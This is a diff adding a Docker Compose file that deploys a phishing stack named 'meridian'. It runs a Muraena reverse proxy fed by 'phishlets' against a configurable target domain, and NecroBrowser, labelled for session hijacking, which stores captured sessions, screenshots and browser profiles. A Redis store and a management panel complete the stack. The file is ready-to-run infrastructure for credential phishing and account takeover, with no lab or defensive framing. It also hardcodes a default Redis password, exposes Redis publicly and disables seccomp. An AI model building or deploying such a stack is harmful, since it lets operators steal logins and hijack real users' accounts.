@@ -1,0 +1,141 @@
+version: '3.8'
+
+services:
+  # Redis - Data Storage
+  redis:
+    image: redis:7-alpine
+    container_name: meridian-redis
+    restart: unless-stopped
+    command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD:-meridian2026}
+    ports:
+      - "6379:6379"
+    volumes:
+      - redis-data:/data
+      - ./config/redis.conf:/usr/local/etc/redis/redis.conf:ro
+    networks:
+      - meridian-network
+    healthcheck:
+      test: ["CMD", "redis-cli", "--raw", "incr", "ping"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 40s
+
+  # Muraena - Reverse Proxy
+  muraena:
+    build:
+      context: .
+      dockerfile: Dockerfile.muraena
+    container_name: meridian-muraena
+    restart: unless-stopped
+    ports:
+      - "80:80"
+      - "443:443"
+    volumes:
+      - ./config/muraena_config.toml:/app/config/config.toml:ro
+      - ./phishlets:/app/phishlets:ro
+      - ./ssl:/app/ssl:ro
+      - muraena-logs:/app/logs
+      - muraena-sessions:/app/sessions
+      - muraena-data:/app/data
+    environment:
+      - MURAENA_CONFIG=/app/config/config.toml
+      - PHISHING_DOMAIN=${PHISHING_DOMAIN:-phish.example.com}
+      - TARGET_DOMAIN=${TARGET_DOMAIN:-example.com}
+      - REDIS_HOST=redis
+      - REDIS_PORT=6379
+      - REDIS_PASSWORD=${REDIS_PASSWORD:-meridian2026}
+    depends_on:
+      redis:
+        condition: service_healthy
+    networks:
+      - meridian-network
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:80/health"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 60s
+
+  # NecroBrowser - Session Hijacking
+  necrobrowser:
+    build:
+      context: .
+      dockerfile: Dockerfile.necrobrowser
+    container_name: meridian-necrobrowser
+    restart: unless-stopped
+    ports:
+      - "3000:3000"
+    volumes:
+      - ./config/necrobrowser_config.json:/app/config.json:ro
+      - necro-logs:/app/logs
+      - necro-sessions:/app/sessions
+      - necro-screenshots:/app/screenshots
+      - necro-profiles:/app/profiles
+    environment:
+      - NODE_ENV=production
+      - REDIS_HOST=redis
+      - REDIS_PORT=6379
+      - REDIS_PASSWORD=${REDIS_PASSWORD:-meridian2026}
+      - API_PORT=3000
+      - PUPPETEER_EXECUTABLE_PATH=/usr/bin/google-chrome-stable
+    depends_on:
+      redis:
+        condition: service_healthy
+    networks:
+      - meridian-network
+    security_opt:
+      - seccomp:unconfined
+    shm_size: 2gb
+    healthcheck:
+      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+      start_period: 60s
+
+  # Web Panel (Optional) - Management Interface
+  web-panel:
+    image: nginx:alpine
+    container_name: meridian-panel
+    restart: unless-stopped
+    ports:
+      - "8080:80"
+    volumes:
+      - ./web:/usr/share/nginx/html:ro
+      - ./config/nginx.conf:/etc/nginx/nginx.conf:ro
+    networks:
+      - meridian-network
+    depends_on:
+      - muraena
+      - necrobrowser
+    healthcheck:
+      test: ["CMD", "wget", "--quiet", "--tries=1", "--spider", "http://localhost/"]
+      interval: 30s
+      timeout: 10s
+      retries: 3
+
+networks:
+  meridian-network:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 172.28.0.0/16
+
+volumes:
+  redis-data:
+    driver: local
+  muraena-logs:
+    driver: local
+  muraena-sessions:
+    driver: local
+  muraena-data:
+    driver: local
+  necro-logs:
+    driver: local
+  necro-sessions:
+    driver: local
+  necro-screenshots:
+    driver: local
+  necro-profiles:
+    driver: local
